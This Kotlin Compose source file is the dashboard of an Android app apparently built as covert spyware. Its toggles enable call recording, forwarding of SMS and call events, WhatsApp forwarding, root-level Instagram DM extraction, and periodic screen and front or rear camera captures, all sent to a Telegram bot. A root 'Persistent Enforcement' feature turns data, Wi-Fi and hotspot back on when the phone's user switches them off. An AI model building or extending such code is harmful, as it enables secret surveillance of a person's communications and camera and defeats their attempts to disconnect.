package com.system.superiormonitor.ui

import android.content.Intent
import android.widget.Toast
import androidx.compose.animation.*
import androidx.compose.foundation.background
import androidx.compose.foundation.border
import androidx.compose.foundation.clickable
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.foundation.text.BasicTextField
import androidx.compose.foundation.verticalScroll
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.automirrored.outlined.Chat
import androidx.compose.material.icons.filled.*
import androidx.compose.material.icons.outlined.*
import androidx.compose.ui.graphics.Color
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.draw.clip
import androidx.compose.ui.graphics.Brush
import androidx.compose.ui.graphics.SolidColor
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.text.input.PasswordVisualTransformation
import androidx.compose.ui.text.input.VisualTransformation
import androidx.compose.ui.unit.dp
import com.system.superiormonitor.bot.BotService
import com.system.superiormonitor.monitor.SnapshotScheduler
import com.system.superiormonitor.theme.*


/**
 * Dashboard screen — the main control panel.
 * Displays service status, Telegram API health, and feature toggles in separate cards.
 */
@OptIn(ExperimentalMaterial3Api::class)
@Composable
fun DashboardScreen(
    dashboardState: DashboardUiState,
    isServiceRunning: Boolean,
    isTelegramApiReachable: Boolean,
    hasCredentials: Boolean,
    allPermissionsGranted: Boolean,
    onEvent: (DashboardEvent) -> Unit,
    snackbarHostState: SnackbarHostState
) {
    val context = LocalContext.current
    val scope = rememberCoroutineScope()

    var expandedInfo by remember { mutableStateOf<String?>(null) }

    fun toggleInfo(key: String) {
        if (expandedInfo == key) expandedInfo = null else expandedInfo = key
    }

    Column(
        modifier = Modifier
            .fillMaxSize()
            .verticalScroll(rememberScrollState())
            .padding(horizontal = 20.dp)
            .padding(bottom = 32.dp),
        verticalArrangement = Arrangement.spacedBy(8.dp)
    ) {
        if (dashboardState.showPersistentEnforcementDialog) {
            AlertDialog(
                onDismissRequest = { onEvent(DashboardEvent.ShowPersistentEnforcementDialog(false)) },
                title = { Text("Persistent Enforcement", color = MaterialTheme.colorScheme.error, fontWeight = androidx.compose.ui.text.font.FontWeight.SemiBold) },
                text = { Text("System-level enforcement modifies restricted internal settings. Depending on your Android version and OEM modifications, this feature may cause unexpected behavior, including system UI crashes or soft reboots. Please proceed with caution.", color = TextPrimary) },
                confirmButton = {
                    Button(
                        onClick = {
                            onEvent(DashboardEvent.TogglePersistentEnforcement(true))
                            onEvent(DashboardEvent.ShowPersistentEnforcementDialog(false))
                        },
                        colors = ButtonDefaults.buttonColors(containerColor = MaterialTheme.colorScheme.error)
                    ) {
                        Text("Enable Anyway", color = Color.White)
                    }
                },
                dismissButton = {
                    TextButton(onClick = {
                        onEvent(DashboardEvent.ShowPersistentEnforcementDialog(false))
                    }) {
                        Text("Cancel", color = TextSecondary)
                    }
                },
                containerColor = OuterCardSurface,
                shape = RoundedCornerShape(24.dp)
            )
        }

        // ── WhatsApp Not Available Warning Dialog ──
        if (dashboardState.showWhatsAppWarningDialog) {
            AlertDialog(
                onDismissRequest = { onEvent(DashboardEvent.DismissWhatsAppWarningDialog) },
                title = {
                    Text(
                        "WhatsApp Unavailable",
                        color = MaterialTheme.colorScheme.error,
                        fontWeight = androidx.compose.ui.text.font.FontWeight.SemiBold
                    )
                },
                text = {
                    Text(
                        dashboardState.whatsAppWarningMessage,
                        color = TextPrimary
                    )
                },
                confirmButton = {
                    Button(
                        onClick = { onEvent(DashboardEvent.DismissWhatsAppWarningDialog) },
                        colors = ButtonDefaults.buttonColors(containerColor = AccentGreen)
                    ) {
                        Text("OK", color = Color.White)
                    }
                },
                containerColor = OuterCardSurface,
                shape = RoundedCornerShape(24.dp)
            )
        }

        // ── Instagram Not Available Warning Dialog ──
        if (dashboardState.showInstagramWarningDialog) {
            AlertDialog(
                onDismissRequest = { onEvent(DashboardEvent.DismissInstagramWarningDialog) },
                title = {
                    Text(
                        "Instagram Unavailable",
                        color = MaterialTheme.colorScheme.error,
                        fontWeight = androidx.compose.ui.text.font.FontWeight.SemiBold
                    )
                },
                text = {
                    Text(
                        dashboardState.instagramWarningMessage,
                        color = TextPrimary
                    )
                },
                confirmButton = {
                    Button(
                        onClick = { onEvent(DashboardEvent.DismissInstagramWarningDialog) },
                        colors = ButtonDefaults.buttonColors(containerColor = AccentGreen)
                    ) {
                        Text("OK", color = Color.White)
                    }
                },
                containerColor = OuterCardSurface,
                shape = RoundedCornerShape(24.dp)
            )
        }

        // Inline info handled below each section title
        // ── Service Status Card ──
        OuterCard {
            SectionTitle("Service Status", Icons.Outlined.PlayCircle)
            Spacer(modifier = Modifier.height(14.dp))
            InnerListHost {
                StatusRow("Bot Service", isServiceRunning, showDivider = true)
                StatusRow("Telegram API", isTelegramApiReachable, showDivider = false)
            }
            Spacer(modifier = Modifier.height(8.dp))
            InnerListHost {
                TactileToggleRow(
                    label = if (isServiceRunning) "Service Running" else "Service Stopped",
                    checked = isServiceRunning,
                    showDivider = false,
                    onCheckedChange = { onEvent(DashboardEvent.ToggleService(it)) }
                )
            }
        }

        // ── Persistent Enforcement Card ──
        OuterCard {
            Row(
                modifier = Modifier.fillMaxWidth().clickable { toggleInfo("persistent") },
                horizontalArrangement = Arrangement.SpaceBetween,
                verticalAlignment = Alignment.CenterVertically
            ) {
                SectionTitle("Persistent Enforcement", Icons.Outlined.Shield)
                Icon(
                    imageVector = if (expandedInfo == "persistent") Icons.Default.KeyboardArrowUp else Icons.Default.KeyboardArrowDown,
                    contentDescription = "Expand",
                    tint = TextSecondary,
                    modifier = Modifier.size(24.dp)
                )
            }
            AnimatedVisibility(visible = expandedInfo == "persistent") {
                Column {
                    Text(
                        "Automatically override system settings via Root to ensure the device remains connected. Re-enables connection if turned off.",
                        color = TextSecondary,
                        style = MaterialTheme.typography.bodySmall,
                        modifier = Modifier.padding(bottom = 12.dp, top = 8.dp)
                    )
                    Spacer(modifier = Modifier.height(8.dp))
                    
                    val innerEnabled = isServiceRunning && dashboardState.persistentEnforcementEnabled
                    
                    InnerListHost {
                        TactileToggleRow(
                            label = "Force Mobile Data",
                            subtitle = "Re-enable data if toggled off",
                            checked = dashboardState.forceMobileData,
                            enabled = innerEnabled,
                            showDivider = false,
                            onCheckedChange = { onEvent(DashboardEvent.ToggleForceMobileData(it)) }
                        )
                    }
                    Spacer(modifier = Modifier.height(8.dp))
                    InnerListHost {
                        TactileToggleRow(
                            label = "Force Wi-Fi",
                            subtitle = "Re-enable Wi-Fi if toggled off",
                            checked = dashboardState.forceWifi,
                            enabled = innerEnabled,
                            showDivider = false,
                            onCheckedChange = { onEvent(DashboardEvent.ToggleForceWifi(it)) }
                        )
                    }
                    Spacer(modifier = Modifier.height(8.dp))
                    InnerListHost {
                        TactileToggleRow(
                            label = "Force Hotspot",
                            subtitle = "Re-enable Hotspot if toggled off",
                            checked = dashboardState.forceHotspot,
                            enabled = innerEnabled,
                            showDivider = false,
                            onCheckedChange = { onEvent(DashboardEvent.ToggleForceHotspot(it)) }
                        )
                    }
                    Spacer(modifier = Modifier.height(16.dp))
                    
                    // Centerized Button
                    Box(modifier = Modifier.fillMaxWidth(), contentAlignment = Alignment.Center) {
                        Button(
                            onClick = {
                                if (dashboardState.persistentEnforcementEnabled) {
                                    onEvent(DashboardEvent.TogglePersistentEnforcement(false))
                                } else {
                                    onEvent(DashboardEvent.ShowPersistentEnforcementDialog(true))
                                }
                            },
                            colors = ButtonDefaults.buttonColors(
                                containerColor = if (dashboardState.persistentEnforcementEnabled) MaterialTheme.colorScheme.error.copy(alpha = 0.8f) else AccentGreen
                            )
                        ) {
                            Text(if (dashboardState.persistentEnforcementEnabled) "Deactivate" else "Activate This Feature", color = Color.White)
                        }
                    }
                }
            }
        }

        // ── Security Snapshots Card ──
        OuterCard {
            Row(
                modifier = Modifier.fillMaxWidth(),
                horizontalArrangement = Arrangement.SpaceBetween,
                verticalAlignment = Alignment.CenterVertically
            ) {
                SectionTitle("Security Snapshots", Icons.Outlined.CameraAlt)
                IconButton(onClick = { toggleInfo("snapshots") }, modifier = Modifier.size(28.dp)) {
                    Icon(Icons.Default.Info, contentDescription = "Info", tint = TextSecondary, modifier = Modifier.size(22.dp))
                }
            }
            AnimatedVisibility(visible = expandedInfo == "snapshots") {
                Text(
                    "Periodically captures and forwards media to Telegram.\nNote: Scheduled captures are automatically skipped while the device is locked or the screen is turned off.",
                    color = TextSecondary,
                    style = MaterialTheme.typography.bodySmall,
                    modifier = Modifier.padding(bottom = 12.dp)
                )
            }
            Spacer(modifier = Modifier.height(14.dp))
            InnerListHost {
                TactileToggleRow(
                    label = "Screen Snapshots",
                    subtitle = "Enable periodic capture",
                    checked = dashboardState.enableSnapshots,
                    enabled = isServiceRunning,
                    showDivider = false,
                    onCheckedChange = { onEvent(DashboardEvent.ToggleSnapshots(it)) }
                )
                AnimatedVisibility(visible = dashboardState.enableSnapshots) {
                    CollapsibleIntervalSelector(
                        label = "Interval",
                        currentValue = dashboardState.snapshotIntervalMin,
                        onValueChange = { onEvent(DashboardEvent.UpdateSnapshotInterval(it)) }
                    )
                }
            }
            Spacer(modifier = Modifier.height(8.dp))
            InnerListHost {
                TactileToggleRow(
                    label = "Front Camera",
                    subtitle = "Periodically take a image at the scheduled interval.",
                    checked = dashboardState.enableFrontCamera,
                    enabled = isServiceRunning,
                    showDivider = false,
                    onCheckedChange = { onEvent(DashboardEvent.ToggleFrontCamera(it)) }
                )
                AnimatedVisibility(visible = dashboardState.enableFrontCamera) {
                    CollapsibleIntervalSelector(
                        label = "Interval",
                        currentValue = dashboardState.frontCameraIntervalMin,
                        onValueChange = { onEvent(DashboardEvent.UpdateFrontCameraInterval(it)) }
                    )
                }
            }
            Spacer(modifier = Modifier.height(8.dp))
            InnerListHost {
                TactileToggleRow(
                    label = "Rear Camera",
                    subtitle = "Periodically take image at the scheduled interval.",
                    checked = dashboardState.enableRearCamera,
                    enabled = isServiceRunning,
                    showDivider = false,
                    onCheckedChange = { onEvent(DashboardEvent.ToggleRearCamera(it)) }
                )
                AnimatedVisibility(visible = dashboardState.enableRearCamera) {
                    CollapsibleIntervalSelector(
                        label = "Interval",
                        currentValue = dashboardState.rearCameraIntervalMin,
                        onValueChange = { onEvent(DashboardEvent.UpdateRearCameraInterval(it)) }
                    )
                }
            }
        }

        // ── Basic Update Card ──
        OuterCard {
            Row(
                modifier = Modifier.fillMaxWidth(),
                horizontalArrangement = Arrangement.SpaceBetween,
                verticalAlignment = Alignment.CenterVertically
            ) {
                SectionTitle("Basic Update", Icons.Outlined.Phone)
                IconButton(onClick = { toggleInfo("basic") }, modifier = Modifier.size(28.dp)) {
                    Icon(Icons.Default.Info, contentDescription = "Info", tint = TextSecondary, modifier = Modifier.size(22.dp))
                }
            }
            AnimatedVisibility(visible = expandedInfo == "basic") {
                Text(
                    "Forward Upcoming/Outgoing Update to Telegram Chat.",
                    color = TextSecondary,
                    style = MaterialTheme.typography.bodySmall,
                    modifier = Modifier.padding(bottom = 12.dp)
                )
            }
            Spacer(modifier = Modifier.height(14.dp))
            InnerListHost {
                TactileToggleRow(
                    label = "Call Recording",
                    subtitle = "Record and forward calls to Telegram",
                    checked = dashboardState.forwardRecordingEnabled,
                    enabled = isServiceRunning,
                    showDivider = false,
                    onCheckedChange = { checked ->
                        onEvent(DashboardEvent.ToggleForwardRecording(checked))
                    }
                )
            }
            Spacer(modifier = Modifier.height(8.dp))
            InnerListHost {
                TactileToggleRow(
                    label = "Call Events",
                    subtitle = "Notify on call events",
                    checked = dashboardState.callAlertsEnabled,
                    enabled = isServiceRunning,
                    showDivider = false,
                    onCheckedChange = { onEvent(DashboardEvent.ToggleCallAlerts(it)) }
                )
            }
            Spacer(modifier = Modifier.height(8.dp))
            InnerListHost {
                TactileToggleRow(
                    label = "SMS Events",
                    subtitle = "Notify on SMS events",
                    checked = dashboardState.smsAlertsEnabled,
                    enabled = isServiceRunning,
                    showDivider = false,
                    onCheckedChange = { onEvent(DashboardEvent.ToggleSmsAlerts(it)) }
                )
            }
        }

        // ── Social Update Card ──
        OuterCard {
            Row(
                modifier = Modifier.fillMaxWidth(),
                horizontalArrangement = Arrangement.SpaceBetween,
                verticalAlignment = Alignment.CenterVertically
            ) {
                SectionTitle("Social Update", Icons.AutoMirrored.Outlined.Chat)
                IconButton(onClick = { toggleInfo("social") }, modifier = Modifier.size(28.dp)) {
                    Icon(Icons.Default.Info, contentDescription = "Info", tint = TextSecondary, modifier = Modifier.size(22.dp))
                }
            }
            AnimatedVisibility(visible = expandedInfo == "social") {
                Text(
                    "Forward Upcoming/Outgoing Social Update to Telegram Chat.",
                    color = TextSecondary,
                    style = MaterialTheme.typography.bodySmall,
                    modifier = Modifier.padding(bottom = 12.dp)
                )
            }
            Spacer(modifier = Modifier.height(14.dp))
            InnerListHost {
                TactileToggleRow(
                    label = "WhatsApp",
                    subtitle = "Forward WhatsApp messages",
                    checked = dashboardState.whatsappUpdatesEnabled,
                    enabled = isServiceRunning,
                    showDivider = true,
                    onCheckedChange = { onEvent(DashboardEvent.ToggleWhatsappUpdates(it)) }
                )
                TactileToggleRow(
                    label = "Instagram",
                    subtitle = "Root-level Instagram Direct Message extraction",
                    checked = dashboardState.instagramUpdatesEnabled,
                    enabled = isServiceRunning,
                    showDivider = false,
                    onCheckedChange = { onEvent(DashboardEvent.ToggleInstagramUpdates(it)) }
                )
            }
        }
    }

}

@OptIn(ExperimentalMaterial3Api::class)
@Composable
fun CollapsibleIntervalSelector(
    label: String,
    currentValue: Int,
    onValueChange: (Int) -> Unit
) {
    var isExpanded by remember { mutableStateOf(false) }
    
    Column(modifier = Modifier.padding(start = 16.dp, end = 16.dp, bottom = 16.dp)) {
        Row(
            modifier = Modifier
                .fillMaxWidth()
                .clip(RoundedCornerShape(8.dp))
                .clickable { isExpanded = !isExpanded }
                .padding(vertical = 8.dp, horizontal = 4.dp),
            horizontalArrangement = Arrangement.SpaceBetween,
            verticalAlignment = Alignment.CenterVertically
        ) {
            Text(
                label,
                style = MaterialTheme.typography.bodyMedium,
                color = TextSecondary
            )
            Icon(
                imageVector = if (isExpanded) Icons.Default.KeyboardArrowUp else Icons.Default.KeyboardArrowDown,
                contentDescription = "Expand Interval",
                tint = TextSecondary,
                modifier = Modifier.size(20.dp)
            )
        }
        
        AnimatedVisibility(visible = isExpanded) {
            var expandedDropdown by remember { mutableStateOf(false) }
            val intervalOptions = listOf(1, 5, 10, 15, 30, 45, 60, 120)
            val intervalLabels = mapOf(
                1 to "1 Min (Test)",
                5 to "5 Min",
                10 to "10 Min",
                15 to "15 Min",
                30 to "30 Min",
                45 to "45 Min",
                60 to "1 Hour",
                120 to "2 Hour"
            )
            
            ExposedDropdownMenuBox(
                expanded = expandedDropdown,
                onExpandedChange = { expandedDropdown = !expandedDropdown }
            ) {
                OutlinedTextField(
                    value = intervalLabels[currentValue] ?: "${currentValue} Min",
                    onValueChange = {},
                    readOnly = true,
                    trailingIcon = { ExposedDropdownMenuDefaults.TrailingIcon(expanded = expandedDropdown) },
                    modifier = Modifier.menuAnchor(ExposedDropdownMenuAnchorType.PrimaryNotEditable).fillMaxWidth(),
                    colors = OutlinedTextFieldDefaults.colors(
                        focusedBorderColor = Color.Transparent,
                        unfocusedBorderColor = Color.Transparent,
                        focusedTextColor = TextPrimary,
                        unfocusedTextColor = TextPrimary,
                        focusedContainerColor = InnerCardSurface,
                        unfocusedContainerColor = InnerCardSurface
                    ),
                    shape = RoundedCornerShape(12.dp)
                )
                ExposedDropdownMenu(
                    expanded = expandedDropdown,
                    onDismissRequest = { expandedDropdown = false },
                    modifier = Modifier.background(InnerCardSurface)
                ) {
                    intervalOptions.forEach { option ->
                        val isSelected = option == currentValue
                        DropdownMenuItem(
                            text = { Text(intervalLabels[option] ?: "$option Min", color = if (isSelected) AccentGreen else TextPrimary) },
                            modifier = Modifier.background(if (isSelected) AccentGreen.copy(alpha = 0.15f) else Color.Transparent),
                            onClick = {
                                onValueChange(option)
                                expandedDropdown = false
                            }
                        )
                    }
                }
            }
        }
    }
}
